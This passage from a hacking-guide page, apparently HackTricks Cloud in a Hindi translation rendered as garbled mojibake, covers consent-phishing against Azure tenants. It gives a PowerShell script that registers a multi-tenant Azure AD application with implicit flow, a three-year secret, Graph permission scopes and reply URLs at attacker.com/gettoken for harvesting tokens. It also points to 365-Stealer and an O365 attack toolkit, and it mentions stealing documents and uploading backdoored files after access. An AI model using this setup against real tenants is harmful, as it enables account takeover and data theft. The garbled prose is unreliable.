* рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ рдХреЗрд╡рд▓ `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` рдФрд░ рдПрдХ рдХрд╕реНрдЯрдо рднреВрдорд┐рдХрд╛ рдЬрд┐рд╕рдореЗрдВ `рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдХреЛ рджреЗрдиреЗ рдХреА рдЕрдиреБрдорддрд┐` рд╢рд╛рдорд┐рд▓ рд╣реИ, рдЯреЗрдиреЗрдЯ-рд╡реНрдпрд╛рдкреА рд╕рд╣рдорддрд┐ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рд╡рд╣ **рдРрдк рдХреЛ рдордВрдЬреВрд░реА рджреЗ рдЬреЛ рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рд╕рд╣рдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**, рддреЛ рдЖрдкрдХреЛ **рдЙрдирдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдПрдХ рднреВрдорд┐рдХрд╛ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдлрд╝рд┐рд╢ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП**ред

рдЖрдк CLI рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдРрдк рднреА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

рдЪреЗрдХ рдХрд░реЗрдВ [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) рдпрд╣ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдЗрд╕реЗ рдХреИрд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВред

{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкреНрд░рд╛рдкреНрдд **access token** **graph endpoint** рдХреЗ рд▓рд┐рдП рд╣реЛрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рд╕реНрдХреЛрдк рд╣реИрдВ: `User.Read` рдФрд░ `User.ReadBasic.All` (рдЕрдиреБрд░реЛрдзрд┐рдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ)ред рдЖрдк рдЕрдиреНрдп рдХреНрд░рд┐рдпрд╛рдПрдБ рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдВрдЧреЗ (рд▓реЗрдХрд┐рди рдпреЗ **рд╕рдВрдЧрдарди рдореЗрдВ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рд╣реИрдВ**)ред
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

рдЖрдк рдЗрд╕ рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## Post-Exploitation

рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдкрдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рддрдХ рдкрд╣реБрдБрдЪ рдорд┐рд▓ рдЬрд╛рддреА рд╣реИ, рддреЛ рдЖрдк рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдЪреБрд░рд╛рдиреЗ рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдмреИрдХрдбреЛрд░ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдЬреИрд╕реА рдЪреАрдЬреЗрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## References

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред**

</details>
{% endhint %}
